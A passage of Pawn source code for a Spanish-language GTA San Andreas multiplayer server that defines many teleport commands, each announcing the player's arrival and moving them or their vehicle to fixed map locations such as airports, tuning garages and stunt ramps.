	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a parkour monster 2. {00BFFF}(/Monsterpk2)",PlayerName);
	GameTextForPlayer(playerid, "~w~Bienvenido a ~n~~r~Monster Parkour 2", 2500, 3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, 2829.4695,196.5135,15.0065);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}


CMD:monsterpk3(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a monster parkour 3. {00BFFF}(/Monsterpk3)",PlayerName);
	GameTextForPlayer(playerid, "~w~Bienvenido a ~n~~r~Monster Parkour 3", 2500, 3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, 492.3899,-1892.1544,3.3173);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:ss1(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super salto 1. {00BFFF}(/Ss1)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Super Salto 1",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,1867.1786,-146.1077,2465.8916);
 	GivePlayerWeapon(playerid, 46, 1);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:ss2(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super salto 2. {00BFFF}(/Ss2)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Super Salto 2",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,3443.69995117,540.90002441,2014.00000000);
 	GivePlayerWeapon(playerid, 46, 1);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:ss3(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super salto 3. {00BFFF}(/Ss3)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Super Salto 3",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,-5.79980469,7534.39941406,3041.60009766);
 	GivePlayerWeapon(playerid, 46, 1);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:ss4(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super salto 4. {00BFFF}(/Ss4)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Super Salto 4",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,-3788.4465,1579.0140,1665.6820);
 	GivePlayerWeapon(playerid, 46, 1);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:ss5(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a super salto 5. {00BFFF}(/Ss5)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Super Salto 5",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, -275, -633, 16502);
 	GivePlayerWeapon(playerid, 46, 1);
 	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
 	TogglePlayerControllable(playerid, 0);
	return 1;
}

CMD:mansion(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a la mansion de madd dogg. {00BFFF}(/Mansion)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido a la ~n~~r~Mansion de Madd Dogg",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid,1280.5828,-822.5976,83.8131);
	return 1;
}

CMD:cementerio(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al cementerio de los santos. {00BFFF}(/Cementerio)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Cementerio",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,841.7794,-1102.2029,24.3040);
    return 1;
}
CMD:bikepark(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al bike park. {00BFFF}(/BikePark)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Bike Park",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,1958.6399,-1448.4347,13.4731);
    return 1;
}

CMD:probando(playerid,params[]){
	#pragma unused params
	SetPlayerPos(playerid, -1428.7313, 2165.5103, 49.8121);
	return 1;
}


CMD:lsa(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al aeropuerto de los santos. {00BFFF}(/Lsa)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Aeropuerto de Los Santos",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	new vehicleid = GetPlayerVehicleID(playerid);
	new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,1920.9316,-2254.4070,14.8189);
	}
	SetPlayerPos(playerid, 1920.9316,-2254.4070,14.8189);
	return 1;
}

CMD:sfa(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al aeropuerto de san fierro. {00BFFF}(/Sfa)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Aeropuerto de San Fierro",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-1660.3152,-167.5315,14.1484);
	}
    SetPlayerPos(playerid,-1660.3152,-167.5315,14.1484);
    return 1;
}
CMD:tune1(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al garaje tuning 1. {00BFFF}(/Tune1)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Garaje Tuning 1",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-1935.9851,231.7287,34.1563);
	}
    SetPlayerPos(playerid,-1935.9851,231.7287,34.1563);
    return 1;
}
CMD:tune2(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al garaje tuning 2. {00BFFF}(/Tune2)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Garaje Tuning 2",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-2709.7312,217.4238,4.1797);
	}
    SetPlayerPos(playerid,-2709.7312,217.4238,4.1797);
    return 1;
}
CMD:tune3(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al garaje tuning 3. {00BFFF}(/Tune3)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Garaje Tuning 3",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,2386.8020,1036.3203,10.8203);
	}
    SetPlayerPos(playerid,2386.8020,1036.3203,10.8203);
    return 1;
}
CMD:tune4(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al garaje tuning 4. {00BFFF}(/Tune4)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Garaje Tuning 4",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,2644.9768,-2030.9032,13.5540);
	}
    SetPlayerPos(playerid,2644.9768,-2030.9032,13.5540);
    return 1;
}
CMD:tune5(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al garaje tuning 5. {00BFFF}(/Tune5)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Garaje Tuning 5",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,1041.6161,-1032.1140,32.0307);
	}
    SetPlayerPos(playerid,1041.6161,-1032.1140,32.0307);
    return 1;
}
CMD:lva(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al aeropuerto de las venturas. {00BFFF}(/Lva)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Aeropuerto de Las Venturas",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	new vehicleid = GetPlayerVehicleID(playerid);
	new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,1318.7224,1252.6541,10.8203);
	}
	SetPlayerPos(playerid,1318.7224,1252.6541,10.8203);
	return 1;
}
CMD:area51(playerid,params[])
{
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al area 51. {00BFFF}(/Area51)",PlayerName);
	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Area 51",2500,3);
	SendClientMessageToAll(red, fString);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	new vehicleid = GetPlayerVehicleID(playerid);
	new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,213.9564,1916.4924,17.6406);
	}
	SetPlayerPos(playerid,213.9564,1916.4924,17.6406);
	return 1;
}
CMD:aa(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al aeropuerto abandonado. {00BFFF}(/Aa)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Aeropuerto Abandonado",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,405.1443,2451.2659,16.5000);
	}
    SetPlayerPos(playerid,405.1443,2451.2659,16.5000);
    return 1;
}
CMD:drift(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a drift. {00BFFF}(/Drift)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a la ~n~~r~pista de Drift",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-312.2979,1537.2542,75.5625);
	}
    SetPlayerPos(playerid,-312.2979,1537.2542,75.5625);
    return 1;
}
CMD:grove(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a grove street. {00BFFF}(/Grove)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Grove Street",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,2495.3428,-1665.3949,13.3438);
	}
    SetPlayerPos(playerid,2495.3428,-1665.3949,13.3438);
    return 1;
}
CMD:playa(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a la playa de los santos. {00BFFF}(/Playa)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a la ~n~~r~Playa de Los Santos",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,239.4935,-1775.6523,4.1718);
	}
    SetPlayerPos(playerid,239.4935,-1775.6523,4.1718);
    return 1;
}
CMD:monte(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al monte chiliad. {00BFFF}(/Monte)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Monte Chiliad", 2000, 3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-2299.0962,-1646.3591,483.6446);
	}
    SetPlayerPos(playerid,-2299.0962,-1646.3591,483.6446);
    return 1;
}
CMD:ls(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a los santos. {00BFFF}(/Ls)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Los Santos",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,2248.4624,-1260.9080,23.9565);
	}
    SetPlayerPos(playerid,2248.4624,-1260.9080,23.9565);
    return 1;
}
CMD:lv(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a las venturas. {00BFFF}(/Lv)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Las venturas",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,2028.8269,1008.3278,10.8203);
	}
    SetPlayerPos(playerid,2028.8269,1008.3278,10.8203);
    return 1;
}
CMD:sf(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a san fierro. {00BFFF}(/Sf)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~San Fierro",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-1973.3889,264.1780,35.1719);
	}
    SetPlayerPos(playerid,-1973.3889,264.1780,35.1719);
    return 1;
}
CMD:mototrial(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a mototrial. {00BFFF}(/MotoTrial)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~MotoTrial",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerPos(playerid,-1464.8214,1558.9128,1052.5313);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,14);
    return 1;
}
CMD:jizzy(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto al club de jizzy. {00BFFF}(/Jizzy)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Club de Jizzy",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-2624.6516,1384.6139,7.2069);
	}
    SetPlayerPos(playerid,-2624.6516,1384.6139,7.2069);
    return 1;
}
CMD:sm1(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a salto mortal 1. {00BFFF}(/Sm1)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Salto Mortal 1",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,-2501.8801,-696.6652,279.7314);
    GivePlayerWeapon(playerid, 46, 1);
    return 1;
}
CMD:sm2(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a salto mortal 2. {00BFFF}(/Sm2)",PlayerName);
 	GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Salto Mortal 2",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,-1753.8240,885.1957,295.8750);
    GivePlayerWeapon(playerid, 46, 1);
    return 1;
}
CMD:sm3(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a salto mortal 3. {00BFFF}(/Sm3)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Salto Mortal 3",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,2060.7109,2436.5349,165.6172);
    GivePlayerWeapon(playerid, 46, 1);
    return 1;
}
CMD:sm4(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a salto mortal 4. {00BFFF}(/Sm4)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido al ~n~~r~Salto Mortal 4",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,-2662.8567,1594.9103,225.7578);
    GivePlayerWeapon(playerid, 46, 1);
    return 1;
}
CMD:torre(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a la torre de los santos. {00BFFF}(/Torre)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a la ~n~~r~Torre de Los Santos",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
    SetPlayerPos(playerid,1545.3116,-1353.8125,329.4734);
    return 1;
}
CMD:lc(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a liberty city. {00BFFF}(/Lc)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Liberty City",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerPos(playerid,-729.276000,503.086944,1371.971801);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,1);
    return 1;
}
CMD:rm3(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a rampa mortal 3. {00BFFF}(/Rm3)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Rampa Mortal 3",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,-4340.5142,4314.5615,1622.8495);
	}
    SetPlayerPos(playerid,-4340.5142,4314.5615,1622.8495);
    return 1;
}
CMD:rm2(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a rampa mortal 2. {00BFFF}(/Rm2)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Rampa Mortal 2",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid,0);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
    new vehicleid = GetPlayerVehicleID(playerid);
    new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,756.9860,-1609.8248,1674.2218);
	}
    SetPlayerPos(playerid,756.9860,-1609.8248,1674.2218);
    return 1;
}
CMD:rm1(playerid,params[])
{
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a rampa mortal 1. {00BFFF}(/Rm1)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Rampa Mortal 1",2500,3);
    SendClientMessageToAll(red, fString);
    SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	TogglePlayerControllable(playerid, 0);
	new vehicleid = GetPlayerVehicleID(playerid);
	new State = GetPlayerState(playerid);
	if(IsPlayerInAnyVehicle(playerid) && State == PLAYER_STATE_DRIVER)
	{
		return SetVehiclePos(vehicleid,5142.5337,-2550.0300,2230.8774);
	}
	SetPlayerPos(playerid,5142.5337,-2550.0300,2230.8774);
    return 1;
}
CMD:dm1(playerid,params[])
{
    if(pDeathmatch[playerid][pInDM1] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estás en el deathmatch 1.");
    new PlayerName[MAX_PLAYER_NAME];
    GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
    format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto a deathmatch 1. {00BFFF}(/Dm1)",PlayerName);
    GameTextForPlayer(playerid,"~w~Bienvenido a ~n~~r~Deathmatch 1",2500,3);
